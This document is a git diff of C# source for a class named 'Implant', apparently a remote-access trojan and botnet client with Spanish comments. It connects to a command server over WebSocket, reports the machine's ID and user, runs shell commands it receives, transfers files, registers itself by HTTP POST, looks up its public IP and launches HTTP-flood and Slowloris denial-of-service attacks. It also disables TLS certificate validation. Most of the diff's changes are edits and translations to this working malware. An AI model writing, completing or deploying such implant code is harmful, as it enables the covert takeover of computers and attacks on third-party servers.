@@ -11,8 +11,10 @@ using System.Net.Sockets;
 using System.Net.WebSockets;
 using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Security;
 using System.Security.Principal;
 using System.Text;
+using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
 using Microsoft.Win32;
@@ -50,13 +52,13 @@ namespace Implant
         private readonly ConcurrentDictionary<string, string> _uploadDestinations = new ConcurrentDictionary<string, string>();
 
 
-        public Implant( string group = "", string base_url="", string sess_key="")
+        public Implant(string group = "", string base_url = "", string sess_key = "")
         {
             _group = group;
             _base_url = base_url;
+            _sess_key = sess_key;
             _currentDir = Directory.GetCurrentDirectory();
             _running = true;
-            _sess_key = sess_key;
             _attacks = new List<Attack>();
             _implId = GetMachineGuid();
             _wsCancellationTokenSource = new CancellationTokenSource();
@@ -88,19 +90,27 @@ namespace Implant
             var uri = new Uri($"ws://{_base_url}?id={_implId}-root={GetRoot()}-user={Environment.UserName}&sess_key={_sess_key}");
 
 
+
             try
             {
 
                 await _ws.ConnectAsync(uri, _wsCancellationTokenSource.Token);
 
+
                 while (_running && _ws.State == WebSocketState.Open)
                 {
                     var message = await ReceiveMessage();
-                   if( message.Contains("Invalid conection")){
+                    if (!string.IsNullOrEmpty(message))
+                    {
+                        if (message.Contains("Invalid conection"))
+                        {
                             await CloseWebSocketAsync();
                             Environment.Exit(0);
-                    }else{
-                        await HandleCommand(message);
+                        }
+                        else
+                        {
+                            await HandleCommand(message);
+                        }
                     }
                 }
             }
@@ -116,11 +126,11 @@ namespace Implant
             try
             {
                 _wsCancellationTokenSource?.Cancel();
-                
+
                 if (_ws != null && _ws.State == WebSocketState.Open)
                 {
-                    await _ws.CloseAsync(WebSocketCloseStatus.NormalClosure, 
-                                        "Client closing", 
+                    await _ws.CloseAsync(WebSocketCloseStatus.NormalClosure,
+                                        "Client closing",
                                         CancellationToken.None);
                 }
             }
@@ -180,7 +190,7 @@ namespace Implant
                 {
                     var chunkData = JsonConvert.DeserializeObject<Dictionary<string, object>>(data["chunk"].ToString());
                     await HandleFileUpload(chunkData, data["destination"].ToString());
-                    
+
                 }
                 else if (data.ContainsKey("list_files"))
                 {
@@ -238,7 +248,7 @@ namespace Implant
 
                 if (command.EndsWith(" &"))
                 {
-                    var result =  await ExecuteShellCommand(command);
+                    var result = await ExecuteShellCommand(command);
 
                     await SendResponse(new
                     {
@@ -326,6 +336,7 @@ namespace Implant
                 if (runInBackground)
                     command = command.Substring(0, command.Length - 1).Trim();
 
+                // Detectar redirección (> o >>)
                 string outputFile = null;
                 bool append = false;
 
@@ -337,6 +348,7 @@ namespace Implant
                     outputFile = redirMatch.Groups[3].Value.Trim().Trim('"');
                 }
 
+                // Parseo de comando + args respetando comillas
                 var matches = Regex.Matches(command, @"'[^']*'|""[^""]*""|[^ \t]+");
                 var parts = matches.Cast<Match>().Select(m =>
                 {
@@ -412,6 +424,7 @@ namespace Implant
                         ? "ERROR: " + errorBuilder.ToString()
                         : outputBuilder.ToString();
 
+                    // Guardar en archivo si había redirección
                     if (!string.IsNullOrEmpty(outputFile))
                     {
                         if (append)
@@ -443,6 +456,7 @@ namespace Implant
         {
             try
             {
+                // Si termina en &, lo quitamos
                 if (command.EndsWith("&"))
                     command = command.Substring(0, command.Length - 1).Trim();
 
@@ -558,7 +572,7 @@ namespace Implant
                 });
             }
         }
-         private async Task HandleFileUpload(Dictionary<string, object> chunkData, string destination)
+        private async Task HandleFileUpload(Dictionary<string, object> chunkData, string destination)
         {
             try
             {
@@ -595,7 +609,7 @@ namespace Implant
                     true,
                     CancellationToken.None);
                 }
-            
+
             }
             catch (Exception e)
             {
@@ -607,7 +621,7 @@ namespace Implant
         {
             if (!Directory.Exists(path))
             {
-                await SendResponse(new { error = $"Path not found: {path}" });
+                await SendResponse(new { error = $"Ruta no encontrada: {path}" });
                 return;
             }
 
@@ -654,9 +668,12 @@ namespace Implant
         }
         private async Task SendFile(string filePath)
         {
+            const int chunkSize = 64 * 1024; // 64 KB
 
-                {
-                }
+            if (filePath.StartsWith("//"))
+            {
+                filePath = filePath.Replace("//", "/");
+            }
 
 
             using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read))
@@ -760,7 +777,7 @@ namespace Implant
                         SlowlorisAttack(target, endTime, cancellationToken);
                         break;
                     default:
-                        throw new ArgumentException($"Unsupported attack: {attackType}");
+                        throw new ArgumentException($"Tipo de ataque no soportado: {attackType}");
                 }
             }
             finally
@@ -821,7 +838,9 @@ namespace Implant
 
         private void HttpFloodAttack(string target, DateTime endTime, CancellationToken cancellationToken)
         {
+            if (!target.StartsWith("http://") && !target.StartsWith("https://"))
             {
+                target = "http://" + target;
             }
 
             ServicePointManager.DefaultConnectionLimit = 1000;
@@ -956,7 +975,7 @@ namespace Implant
                     status = "attack_completed",
                     attack_type = attackType,
                     target = target,
-                    message = "Attack completed"
+                    message = "Ataque finalizado"
                 });
             }
             catch { }
@@ -985,7 +1004,6 @@ namespace Implant
                     root = GetRoot(),
                     user = Environment.UserName,
                     sess_key = _sess_key
-
                 };
                 System.Net.ServicePointManager.ServerCertificateValidationCallback +=
                 (sender, cert, chain, sslPolicyErrors) => true;
@@ -994,11 +1012,12 @@ namespace Implant
                 {
                     var content = new StringContent(JsonConvert.SerializeObject(model), Encoding.UTF8, "application/json");
 
+                    await client.PostAsync($"http://{_base_url}/api/impl/new/{model.impl_id}", content);
                 }
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"Register error: {ex.Message}");
+                Debug.WriteLine($"Error Register: {ex.Message}");
             }
         }
 
@@ -1059,6 +1078,7 @@ namespace Implant
                 using (var client = new WebClient())
                 {
                     client.Proxy = null;
+                    return client.DownloadString("https://api.ipify.org").Trim();
                 }
             }
             catch
@@ -1068,6 +1088,7 @@ namespace Implant
                     using (var client = new WebClient())
                     {
                         client.Proxy = null;
+                        return client.DownloadString("https://ipinfo.io/ip").Trim();
                     }
                 }
                 catch
@@ -1154,7 +1175,7 @@ namespace Implant
             {
                 string url = "localhost";
                 string group = "grupo";
-                string sess_key = "123";
+                string sess_key = "12345678910";
 
                 int port = 4444;
 
